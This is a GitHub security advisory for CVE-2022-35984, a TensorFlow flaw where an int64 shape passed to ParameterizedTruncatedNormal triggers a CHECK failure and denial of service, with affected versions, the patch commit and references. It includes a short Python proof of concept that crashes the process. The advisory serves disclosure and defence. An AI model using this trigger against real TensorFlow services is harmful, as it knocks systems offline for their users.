# [M] TensorFlow vulnerable to `CHECK` fail in `ParameterizedTruncatedNormal`

## Summary
Severity: Medium
Advisory: GHSA-p2xf-8hgm-hpw5
CVE: CVE-2022-35984
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-p2xf-8hgm-hpw5
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
`ParameterizedTruncatedNormal` assumes `shape` is of type `int32`. A valid `shape` of type `int64` results in a mismatched type `CHECK` fail that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
seed = 1618
seed2 = 0
shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)
means = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
stdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
minvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
maxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)
tf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)
```

### Patches
We have patched the issue in GitHub commit [72180be03447a10810edca700cbc9af690dfeb51](https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5
- https://nvd.nist.gov/vuln/detail/CVE-2022-35984
- https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
